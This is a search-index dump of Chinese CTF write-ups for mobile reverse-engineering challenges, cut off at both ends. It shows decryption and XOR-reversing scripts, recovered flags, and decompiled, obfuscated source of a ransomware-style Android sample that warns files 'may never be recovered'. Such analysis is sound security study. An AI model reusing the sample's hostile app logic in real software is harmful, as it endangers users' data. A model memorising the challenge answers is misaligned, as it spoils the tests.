key ))] t . append ( ord ( c )) j = 0 for i in range ( 256 ): j = ( j + s [ i ] + t [ i ]) % 256 s [ i ], s [ j ] = s [ j ], s [ i ] i = 0 j = 0 flag = [] for m in range ( 37 ): i = ( i + 1 ) % 256 j = ( j + s [ i ]) % 256 s [ i ], s [ j ] = s [ j ], s [ i ] x = ( s [ i ] + s [ j ]) % 256 flag . append ( data [ m ] ^ s [ x ]) print ( bytes ( flag )) # EIS{55a0a84f86a6ad40006f014619577ad3}","title":"2 exp"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/","text":"1 \u9898\u76ee jadx \u540e\u68c0\u67e5\uff0c this . button . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf03.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity . this . pwd . getText (). toString (); int result = JNI . getResult ( str ); MainActivity . this . Show ( result ); } }); \u9006\u5411so\u6587\u4ef6\uff1a undefined4 Java_com_example_test_ctf03_JNI_getResult ( int * param_1 , undefined4 param_2 , undefined4 param_3 ) { char * __s ; size_t sVar1 ; char * pcVar2 ; char * __s1 ; char * __s1_00 ; int iVar3 ; __s = ( char * )( ** ( code ** )( * param_1 + 0x2a4 ))( param_1 , param_3 , 0 ); sVar1 = strlen ( __s ); if ( sVar1 == 0xf ) { pcVar2 = ( char * ) malloc ( 1 ); __s1 = ( char * ) malloc ( 1 ); __s1_00 = ( char * ) malloc ( 1 ); Init ( pcVar2 , __s1 , __s1_00 , __s , 0xf ); iVar3 = First ( pcVar2 ); if ( iVar3 != 0 ) { iVar3 = 0 ; do { __s1 [ iVar3 ] = pcVar2 [ iVar3 ] ^ __s1 [ iVar3 ] ; iVar3 = iVar3 + 1 ; } while ( iVar3 != 4 ); iVar3 = strcmp ( __s1 , \" 5-\\x16a\" ); if ( iVar3 == 0 ) { iVar3 = 0 ; do { __s1_00 [ iVar3 ] = __s1 [ iVar3 ] ^ __s1_00 [ iVar3 ] ; iVar3 = iVar3 + 1 ; } while ( iVar3 != 4 ); iVar3 = strcmp ( __s1_00 , \"AFBo}\" ); if ( iVar3 == 0 ) { return 1 ; } return 0 ; } } } return 0 ; } 2 \u9006\u5411 libNative.so \u51fd\u6570 First \u53ca\u5176\u9006\u5411 /* First(char*) */ bool First(char *param_1) { int iVar1; iVar1 = 0; do { param_1[iVar1] = param_1[iVar1] << 1 ^ 0x80; iVar1 = iVar1 + 1; } while (iVar1 != 4); iVar1 = strcmp(param_1,\"LN^dl\"); return iVar1 == 0; } exp1.py c = b \"LN^dl\" r = [] for i in range ( 4 ): r . append (( c [ i ] ^ 0x80 ) >> 1 ) r . append ( c [ 4 ]) print ( bytes ( r )) #b'fgorl' \u7b2c\u4e8c\u4e2a\u51fd\u6570\u53ca\u5176\u9006\u5411 iVar3 = 0; do { __s1[iVar3] = pcVar2[iVar3] ^ __s1[iVar3]; iVar3 = iVar3 + 1; } while (iVar3 != 4); iVar3 = strcmp(__s1,\" 5-\\x16a\"); if (iVar3 == 0) { exp2.py c = b \" 5- \\x16 a\" r1 = b 'LN^dl' r = [] for i in range ( 4 ): r . append ( c [ i ] ^ r1 [ i ]) r . append ( c [ 4 ]) print ( bytes ( r )) #b'l{sra' \u7b2c\u4e09\u4e2a\u51fd\u6570\u53ca\u5176\u9006\u5411 iVar3 = 0; do { __s1_00[iVar3] = __s1[iVar3] ^ __s1_00[iVar3]; iVar3 = iVar3 + 1; } while (iVar3 != 4); iVar3 = strcmp(__s1_00,\"AFBo}\"); if (iVar3 == 0) { return 1; } exp3.py c = b \"AFBo}\" r2 = b \" 5- \\x16 a\" r = [] for i in range ( 4 ): r . append ( c [ i ] ^ r2 [ i ]) r . append ( c [ 4 ]) print ( bytes ( r )) #b'asoy}' \u51fd\u6570 Init \u53ca\u5176\u9006\u5411 /* Init(char*, char*, char*, char const*, int) */ void Init ( char * param_1 , char * param_2 , char * param_3 , char * param_input , int param_5 ) { uint uVar1 ; int iVar2 ; int iVar3 ; if ( param_5 < 1 ) { iVar3 = 0 ; } else { uVar1 = 0 ; iVar3 = 0 ; do { iVar2 = ( int )(( ulonglong )(( longlong )( int ) uVar1 * 0x55555556 ) >> 0x20 ); iVar2 = uVar1 + ( iVar2 - ( iVar2 >> 0x1f )) * -3 ; if ( iVar2 == 2 ) { param_3 [ uVar1 / 3 ] = param_input [ uVar1 ]; } else if ( iVar2 == 1 ) { param_2 [ uVar1 / 3 ] = param_input [ uVar1 ]; } else if ( iVar2 == 0 ) { iVar3 = iVar3 + 1 ; param_1 [ uVar1 / 3 ] = param_input [ uVar1 ]; } uVar1 = uVar1 + 1 ; } while ( param_5 != uVar1 ); } param_1 [ iVar3 ] = '\\0' ; param_2 [ iVar3 ] = '\\0' ; param_3 [ iVar3 ] = '\\0' ; return ; } 3 exp4.py p1 = b 'fgorl' p2 = b 'l{sra' p3 = b 'asoy}' r = [] for ( p11 , p21 , p31 ) in zip ( p1 , p2 , p3 ): r . append ( p11 ) r . append ( p21 ) r . append ( p31 ) print ( bytes ( r )) # b'flag{sosorryla}'","title":"mobile Android2.0"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#1","text":"jadx \u540e\u68c0\u67e5\uff0c this . button . setOnClickListener ( new View . OnClickListener () { // from class: com.example.test.ctf03.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick ( View v ) { String str = MainActivity . this . pwd . getText (). toString (); int result = JNI . getResult ( str ); MainActivity . this . Show ( result ); } }); \u9006\u5411so\u6587\u4ef6\uff1a undefined4 Java_com_example_test_ctf03_JNI_getResult ( int * param_1 , undefined4 param_2 , undefined4 param_3 ) { char * __s ; size_t sVar1 ; char * pcVar2 ; char * __s1 ; char * __s1_00 ; int iVar3 ; __s = ( char * )( ** ( code ** )( * param_1 + 0x2a4 ))( param_1 , param_3 , 0 ); sVar1 = strlen ( __s ); if ( sVar1 == 0xf ) { pcVar2 = ( char * ) malloc ( 1 ); __s1 = ( char * ) malloc ( 1 ); __s1_00 = ( char * ) malloc ( 1 ); Init ( pcVar2 , __s1 , __s1_00 , __s , 0xf ); iVar3 = First ( pcVar2 ); if ( iVar3 != 0 ) { iVar3 = 0 ; do { __s1 [ iVar3 ] = pcVar2 [ iVar3 ] ^ __s1 [ iVar3 ] ; iVar3 = iVar3 + 1 ; } while ( iVar3 != 4 ); iVar3 = strcmp ( __s1 , \" 5-\\x16a\" ); if ( iVar3 == 0 ) { iVar3 = 0 ; do { __s1_00 [ iVar3 ] = __s1 [ iVar3 ] ^ __s1_00 [ iVar3 ] ; iVar3 = iVar3 + 1 ; } while ( iVar3 != 4 ); iVar3 = strcmp ( __s1_00 , \"AFBo}\" ); if ( iVar3 == 0 ) { return 1 ; } return 0 ; } } } return 0 ; }","title":"1 \u9898\u76ee"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#2-libnativeso","text":"","title":"2 \u9006\u5411libNative.so"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#first","text":"/* First(char*) */ bool First(char *param_1) { int iVar1; iVar1 = 0; do { param_1[iVar1] = param_1[iVar1] << 1 ^ 0x80; iVar1 = iVar1 + 1; } while (iVar1 != 4); iVar1 = strcmp(param_1,\"LN^dl\"); return iVar1 == 0; } exp1.py c = b \"LN^dl\" r = [] for i in range ( 4 ): r . append (( c [ i ] ^ 0x80 ) >> 1 ) r . append ( c [ 4 ]) print ( bytes ( r )) #b'fgorl'","title":"\u51fd\u6570First\u53ca\u5176\u9006\u5411"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#_1","text":"iVar3 = 0; do { __s1[iVar3] = pcVar2[iVar3] ^ __s1[iVar3]; iVar3 = iVar3 + 1; } while (iVar3 != 4); iVar3 = strcmp(__s1,\" 5-\\x16a\"); if (iVar3 == 0) { exp2.py c = b \" 5- \\x16 a\" r1 = b 'LN^dl' r = [] for i in range ( 4 ): r . append ( c [ i ] ^ r1 [ i ]) r . append ( c [ 4 ]) print ( bytes ( r )) #b'l{sra'","title":"\u7b2c\u4e8c\u4e2a\u51fd\u6570\u53ca\u5176\u9006\u5411"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#_2","text":"iVar3 = 0; do { __s1_00[iVar3] = __s1[iVar3] ^ __s1_00[iVar3]; iVar3 = iVar3 + 1; } while (iVar3 != 4); iVar3 = strcmp(__s1_00,\"AFBo}\"); if (iVar3 == 0) { return 1; } exp3.py c = b \"AFBo}\" r2 = b \" 5- \\x16 a\" r = [] for i in range ( 4 ): r . append ( c [ i ] ^ r2 [ i ]) r . append ( c [ 4 ]) print ( bytes ( r )) #b'asoy}'","title":"\u7b2c\u4e09\u4e2a\u51fd\u6570\u53ca\u5176\u9006\u5411"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#init","text":"/* Init(char*, char*, char*, char const*, int) */ void Init ( char * param_1 , char * param_2 , char * param_3 , char * param_input , int param_5 ) { uint uVar1 ; int iVar2 ; int iVar3 ; if ( param_5 < 1 ) { iVar3 = 0 ; } else { uVar1 = 0 ; iVar3 = 0 ; do { iVar2 = ( int )(( ulonglong )(( longlong )( int ) uVar1 * 0x55555556 ) >> 0x20 ); iVar2 = uVar1 + ( iVar2 - ( iVar2 >> 0x1f )) * -3 ; if ( iVar2 == 2 ) { param_3 [ uVar1 / 3 ] = param_input [ uVar1 ]; } else if ( iVar2 == 1 ) { param_2 [ uVar1 / 3 ] = param_input [ uVar1 ]; } else if ( iVar2 == 0 ) { iVar3 = iVar3 + 1 ; param_1 [ uVar1 / 3 ] = param_input [ uVar1 ]; } uVar1 = uVar1 + 1 ; } while ( param_5 != uVar1 ); } param_1 [ iVar3 ] = '\\0' ; param_2 [ iVar3 ] = '\\0' ; param_3 [ iVar3 ] = '\\0' ; return ; }","title":"\u51fd\u6570Init\u53ca\u5176\u9006\u5411"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_Android2.0/#3-exp4py","text":"p1 = b 'fgorl' p2 = b 'l{sra' p3 = b 'asoy}' r = [] for ( p11 , p21 , p31 ) in zip ( p1 , p2 , p3 ): r . append ( p11 ) r . append ( p21 ) r . append ( p31 ) print ( bytes ( r )) # b'flag{sosorryla}'","title":"3 exp4.py"},{"location":"%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/mobile_%E4%B8%80%E7%BB%9F%E5%A4%A9%E4%B8%8B/","text":"mobile_\u4e00\u7edf\u5929\u4e0b.md 1 \u9006\u5411 jadx mysigned.apk <application android:theme= \"@style/Theme.AppCompat.Light.NoActionBar\" android:label= \"@string/app_name\" android:icon= \"@drawable/icon\" android:allowBackup= \"true\" android:supportsRtl= \"true\" > <activity android:name= \"android.support.v4.app.o000000o\" android:excludeFromRecents= \"true\" android:launchMode= \"singleInstance\" android:windowSoftInputMode= \"adjustPan\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> <activity-alias android:label= \"@string/second_activity_name\" android:icon= \"@drawable/baah\" android:name= \"android.support.v4.app.Q496512831\" android:enabled= \"false\" android:excludeFromRecents= \"true\" android:launchMode= \"singleInstance\" android:targetActivity= \"android.support.v4.app.o000000o\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity-alias> <provider android:name= \"android.support.v4.app.OO0OOOO0\" android:authorities= \"com.zhuotong.net\" /> </application> sources/android/support/v4/app/o000000o.java import android.support.v7.app.O0000O0o ; public class o000000o extends O0000O0o { static { System . loadLibrary ( OooOO0OOli . d ( \"22161E3B2A433B\" )); } public native void o000000o0 (); public void onCreate ( Bundle bundle ) { getWindow (). addFlags ( 1024 ); this . O000O00o = getApplicationContext (). getPackageManager (); super . onCreate ( bundle ); setContentView ( R . layout . home ); O0000oOo = this ; O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new O0OOO0O ()). O0000Oo0 (); SharedPreferences sharedPreferences = getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ); if ( sharedPreferences . getString ( OooOO0OOli . d ( \"2D0E07\" ), \"\" ). equals ( \"\" )) { this . O000O0OO = \"\" + ((( int ) ( Math . random () * 1000000.0d )) + 10000000 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putString ( OooOO0OOli . d ( \"2D0E07\" ), this . O000O0OO ); edit . commit (); } else { this . O000O0OO = sharedPreferences . getString ( OooOO0OOli . d ( \"2D0E07\" ), \"\" ); } O0000oo = OO0o0 . O00000oO ( OooOO0OOli . dthis . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); O0000ooO = O0000oo . length (); O0000oo0 = new File ( String . valueOf ( Environment . getExternalStorageDirectory ()) + OooOO0OOli . d ( \"60\" )); if ( sharedPreferences . getInt ( OooOO0OOli . d ( \"3C1C1C\" ), 0 ) == 0 ) { new Thread ( new Runnable () { // from class: android.support.v4.app.o000000o.1 @Override // java.lang.Runnable public void run () { OO0o0 . O000000o ( o000000o . O0000oo0 . toString (), o000000o . O0000ooo , 1 , o000000o . this ); } }). start (); return ; } setTitle ( OooOO0OOli . d ( \"1E3E\" )); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); o000000o0 (); } @Override // android.support.v7.app.O0000O0o, android.app.Activity, android.view.KeyEvent.Callback public boolean onKeyDown ( int i , KeyEvent keyEvent ) { if ( i == 4 ) { Toast . makeText ( this , O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ? OooOO0OOli . d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli . d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ), 1 ). show (); } return true ; } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onPause () { String d ; if ( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) { SharedPreferences sharedPreferences = getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putInt ( OooOO0OOli . d ( \"2C1C\" ), sharedPreferences . getInt ( OooOO0OOli . d ( \"2C1C\" ), 0 ) + 1 ); edit . commit (); d = OooOO0OOli . d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ); } else { d = OooOO0OOli . d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ); } Toast . makeText ( this , d , 1 ). show (); super . onPause (); } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onResume () { if (( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( OooOO0OOli . d ( \"1727\" ), 0 ). getInt ( OooOO0OOli . d ( \"2C1C\" ), 0 ) >= 2 ) { setTitle ( OooOO0OOli . d ( \"1E3E\" )); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); } super . onResume (); } \u5e03\u5c40 ./resources/res/layout/home.xml <? xml version = \"1.0\" encoding = \"utf-8\" ?> < LinearLayout xmlns : android = \"http://schemas.android.com/apk/res/android\" android : gravity = \"center\" android : id = \"@+id/ll\" android : layout_width = \"match_parent\" android : layout_height = \"match_parent\" > < FrameLayout android : id = \"@+id/frame_content\" android : layout_width = \"match_parent\" android : layout_height = \"match_parent\" /> </ LinearLayout > frame_content \u76f8\u5173\u5185\u5bb9 $ grep -r frame_content Binary file resources/classes.dex matches resources/res/values/public.xml: <public type = \"id\" name = \"frame_content\" id = \"0x7f070044\" /> resources/res/layout/home.xml: <FrameLayout android:id = \"@+id/frame_content\" android:layout_width = \"match_parent\" android:layout_height = \"match_parent\" /> sources/com/zhuotong/kanxuectf2/R.java: public static final int frame_content = 0x7f070044 ; sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new al ()) .O0000Oo0 () ; sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new an ()) .O0000Oo0 () ; sources/android/support/v4/app/am.java: Toast.makeText ( this, O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ? OooOO0OOli.d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli.d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ) , 1 ) .show () ; sources/android/support/v4/app/am.java: if ( O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ) { sources/android/support/v4/app/am.java: if (( O0000OoO () .O000000o ( R.id.frame_content ) instanceof al ) && getSharedPreferences ( OooOO0OOli.d ( \"1727\" ) , 0 ) .getInt ( OooOO0OOli.d ( \"2C1C\" ) , 0 ) > = 2 ) { sources/android/support/v4/app/am.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new an ()) .O0000Oo0 () ; sources/android/support/v4/app/ao.java: public static final int frame_content = 2131165252 ; sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new O0OOO0O ()) .O0000Oo0 () ; sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new OO00O0 ()) .O0000Oo0 () ; sources/android/support/v4/app/o000000o.java: Toast.makeText ( this, O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ? OooOO0OOli.d ( \"A6EAE2A8F29EA9D9EB8DF4D98BF7E210A7E0DB8CC4D086CFCFD5C8F583D5CE\" ) : OooOO0OOli.d ( \"1F030A2E3C556F2B034921001B6F3E45263B4C1D270A4F3C20563B380D1B2A434F203D103B2709492906032A6F5D2E364C072A190A3D6F522A6F1E0C2C00192A3D552B6E\" ) , 1 ) .show () ; sources/android/support/v4/app/o000000o.java: if ( O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ) { sources/android/support/v4/app/o000000o.java: if (( O0000OoO () .O000000o ( R.id.frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( OooOO0OOli.d ( \"1727\" ) , 0 ) .getInt ( OooOO0OOli.d ( \"2C1C\" ) , 0 ) > = 2 ) { sources/android/support/v4/app/o000000o.java: O0000OoO () .O000000o () .O00000Oo ( R.id.frame_content, new OO00O0 ()) .O0000Oo0 () ; ./sources/defpackage/OooOO0OOli.java $ find . -name OooOO0OOli.java ./sources/defpackage/OooOO0OOli.java ./sources/defpackage/OooOO0OOli.java package defpackage ; import java.io.ByteArrayOutputStream ; /* renamed from: OooOO0OOli reason: default package */ /* loaded from: classes.dex */ public class OooOO0OOli { private static final String KEY = \"OooOO0OOli\" ; private static final String hexString = \"0123456789ABCDEF\" ; public static String d ( String str ) { ByteArrayOutputStream baos = new ByteArrayOutputStream ( str . length () / 2 ); for ( int i = 0 ; i < str . length (); i += 2 ) { baos . write (( hexString . indexOf ( str . charAt ( i )) << 4 ) | hexString . indexOf ( str . charAt ( i + 1 ))); } byte [] b = baos . toByteArray (); int len = b . length ; int keyLen = KEY . length (); for ( int i2 = 0 ; i2 < len ; i2 ++ ) { b [ i2 ] = ( byte ) ( b [ i2 ] ^ KEY . charAt ( i2 % keyLen )); } return new String ( b ); } } 2 OooOO0OOli.d \u7ed3\u679c sources/android/support/v4/app/o000000o.java import android.support.v7.app.O0000O0o ; public class o000000o extends O0000O0o { static { System . loadLibrary ( \"myqtest\" ); } public native void o000000o0 (); public void onCreate ( Bundle bundle ) { getWindow (). addFlags ( 1024 ); this . O000O00o = getApplicationContext (). getPackageManager (); super . onCreate ( bundle ); setContentView ( R . layout . home ); O0000oOo = this ; O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new O0OOO0O ()). O0000Oo0 (); SharedPreferences sharedPreferences = getSharedPreferences ( \"XH\" , 0 ); if ( sharedPreferences . getString ( \"bah\" , \"\" ). equals ( \"\" )) { this . O000O0OO = \"\" + ((( int ) ( Math . random () * 1000000.0d )) + 10000000 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putString ( \"bah\" , this . O000O0OO ); edit . commit (); } else { this . O000O0OO = sharedPreferences . getString ( \"bah\" , \"\" ); } O0000oo = OO0o0 . O00000oO ( \"\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17d5\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17d6\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17da\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9\" ) + this . O000O0OO ; O0000ooo = \"\" + ( Integer . parseInt ( this . O000O0OO ) + 520 ); O0000ooO = O0000oo . length (); O0000oo0 = new File ( String . valueOf ( Environment . getExternalStorageDirectory ()) + \"/\" ); if ( sharedPreferences . getInt ( \"sss\" , 0 ) == 0 ) { new Thread ( new Runnable () { // from class: android.support.v4.app.o000000o.1 @Override // java.lang.Runnable public void run () { OO0o0 . O000000o ( o000000o . O0000oo0 . toString (), o000000o . O0000ooo , 1 , o000000o . this ); } }). start (); return ; } setTitle ( \"QQ\" ); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); o000000o0 (); } @Override // android.support.v7.app.O0000O0o, android.app.Activity, android.view.KeyEvent.Callback public boolean onKeyDown ( int i , KeyEvent keyEvent ) { if ( i == 4 ) { Toast . makeText ( this , O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ? \"\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01\" : \"Please do not quit the software, or the file may never be recovered!\" , 1 ). show (); } return true ; } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onPause () { String d ; if ( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) { SharedPreferences sharedPreferences = getSharedPreferences ( \"XH\" , 0 ); SharedPreferences . Editor edit = sharedPreferences . edit (); edit . putInt ( OooOO0OOli . d ( \"2C1C\" ), sharedPreferences . getInt ( \"cs\" , 0 ) + 1 ); edit . commit (); d = \"\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01\" ; } else { d = \"Please do not quit the software, or the file may never be recovered!\" ; } Toast . makeText ( this , d , 1 ). show (); super . onPause (); } /* JADX INFO: Access modifiers changed from: protected */ @Override // android.support.v4.app.O0OOOOO, android.app.Activity public void onResume () { if (( O0000OoO (). O000000o ( R . id . frame_content ) instanceof O0OOO0O ) && getSharedPreferences ( \"XH\" , 0 ). getInt ( \"cs\" , 0 ) >= 2 ) { setTitle ( \"QQ\" ); O0000OoO (). O000000o (). O00000Oo ( R . id . frame_content , new OO00O0 ()). O0000Oo0 (); } super . onResume (); } \u4ece\u4e0a\u8ff0\u7ed3\u6784\u770b\uff0c\u9875\u9762\u52a0\u8f7d\u4e86 ./sources/android/support/v4/app/OO00O0.java \u8fd9\u4e2a Fragment \u6839\u636e\u754c\u9762\u641c enter your key $ grep -r \"enter your key\" resources/res/layout/main.xml: <EditText android:textSize = \"13sp\" android:id = \"@+id/ed\" android:background = \"@null\" android:focusable = \"false\" android:layout_width = \"0dp\" android:layout_height = \"match_parent\" android:hint = \"Please enter your key!\" android:cursorVisible = \"false\" android:ems = \"10\" android:maxLength = \"50\" android:digits = \"dc2hfygemabl08w{}\" android:layout_weight = \"7\" /> \u4e0a\u4e0b\u6587 resources/res/layout/main.xml <LinearLayout android:orientation= \"horizontal\" android:layout_width= \"match_parent\" android:layout_height= \"0dp\" android:layout_marginBottom= \"3dp\" android:weightSum= \"10\" android:layout_weight= \"2\" > <EditText android:textSize= \"13sp\" android:id= \"@+id/ed\" android:background= \"@null\" android:focusable= \"false\" android:layout_width= \"0dp\" android:layout_height= \"match_parent\" android:hint= \"Please enter your key!\" android:cursorVisible= \"false\" android:ems= \"10\" android:maxLength= \"50\" android:digits= \"dc2hfygemabl08w{}\" android:layout_weight= \"7\" /> <Button android:enabled= \"false\" android:textSize= \"10sp\" android:textColor= \"#ff000000\" android:id= \"@+id/bt\" android:layout_width= \"0dp\" android:layout_height= \"wrap_content\" android:text= \"Cannot decrypt\" android:layout_weight= \"3\" android:textAllCaps= \"false\" /> </LinearLayout> hamilton@hamilton-Lenovo-G470:~/Downloads/mysigned$ grep -r \"R.id.bt\" sources/android/support/v4/app/OO00O0.java: this.O00000Oo = ( Button ) this.O000oOO0.findViewById ( R.id.bt ) ; sources/android/support/v4/app/OO00O0.java: this.O00000o0 = ( TextView ) this.O000oOO0.findViewById ( R.id.bt1 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000o = ( TextView ) this.O000oOO0.findViewById ( R.id.bt2 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000oO = ( TextView ) this.O000oOO0.findViewById ( R.id.bt3 ) ; sources/android/support/v4/app/OO00O0.java: this.O00000oo = ( TextView ) this.O000oOO0.findViewById ( R.id.bt4 ) ; sources/android/support/v4/app/an.java: this.O00000Oo = ( Button ) this.O000oOO0.findViewById ( R.id.bt ) ; sources/android/support/v4/app/an.java: this.O00000o0 = ( TextView ) this.O000oOO0.findViewById ( R.id.bt1 ) ; sources/android/support/v4/app/an.java: this.O00000o = ( TextView ) this.O000oOO0.findViewById ( R.id.bt2 ) ; sources/android/support/v4/app/an.java: this.O00000oO = ( TextView ) this.O000oOO0.findViewById ( R.id.bt3 ) ; sources/android/support/v4/app/an.java: this.O00000oo = ( TextView ) this.O000oOO0.findViewById ( R.id.bt4 ) ; hamilton@hamilton-Lenovo-G470:~/Downloads/mysigned$ grep -r \"R.layout.main\" sources/android/support/v4/app/OO00O0.java: this.O000oOO0 = layoutInflater.inflate ( R.layout.main, viewGroup, false ) ; sources/android/support/v4/app/an.java: this.O000oOO0 = layoutInflater.inflate ( R.layout.main, viewGroup, false ) ; sources/android/support/v4/app/al.java: View inflate = layoutInflater.inflate ( R.layout.main1, viewGroup, false ) ; sources/android/support/v4/app/O0OOO0O.java: View inflate = layoutInflater.inflate ( R.layout.main1, viewGroup, false ) ; bt\u5728 sources/android/support/v4/app/OO00O0.java \u548c sources/android/support/v4/app/an.java \u4e2d\u51fa\u73b0\uff1a sources/android/support/v4/app/OO00O0.java \u70b9\u51fb\u4e8b\u4ef6\uff1a this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.OO00O0.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( OO00O0 . this . O000oOo ) { O0000oo0 = OO00O0 . this . O0000oo0 (); d = OooOO0OOli . d ( \"1B070A6F2B552C3D15193B0600216F582E3C4C08231D0A2E2B496F3C18083D1B0A2B6E101F2309083C0A4F2B205E683B4C1D201A0C276F593B6E\" ); } else if ( OO0o0 . O00000Oo ( o000000o . O0000ooo , OO00O0 . this . O0000O0o . getText (). toString ())) { OO00O0 . this . O000oOo = true ; Toast . makeText ( OO00O0 . this . O0000oo0 (), OooOO0OOli . d ( \"1B070A6F2455366F051A6F0C003D3D552C3B4C08210B4F3B27556F2B090A3D161F3B265F216F0E0C2806013C6E\" ), 0 ). show (); OO00O0 . this . O00000Oo . setText ( OooOO0OOli . d ( \"06014F2B2A533D361C1D260001\" )); return ; } else { O0000oo0 = OO00O0 . this . O0000oo0 (); d = OooOO0OOli . d ( \"040A166F2A423D201E48\" ); } Toast . makeText ( O0000oo0 , d , 0 ). show (); } }); sources/android/support/v4/app/an.java \u70b9\u51fb\u4e8b\u4ef6 this . O00000Oo . setOnClickListener ( new View . OnClickListener () { // from class: android.support.v4.app.an.2 @Override // android.view.View.OnClickListener public void onClick ( View view ) { O0OOOOO O0000oo0 ; String d ; if ( an . this . O000oOo ) { O0000oo0 = an . this . O0000oo0 (); d = OooOO0OOli . d ( \"1B070A6F2B552C3D15193B0600216F582E3C4C08231D0A2E2B496F3C18083D1B0A2B6E101F2309083C0A4F2B205E683B4C1D201A0C276F593B6E\" ); } else if ( ap . O00000Oo ( am . O0000ooo , an . this . O0000O0o . getText (). toString ())) { an . this . O000oOo = true ; Toast . makeText ( an . this . O0000oo0 (), OooOO0OOli . d ( \"1B070A6F2455366F051A6F0C003D3D552C3B4C08210B4F3B27556F2B090A3D161F3B265F216F0E0C2806013C6E\" ), 0 ). show (); an . this . 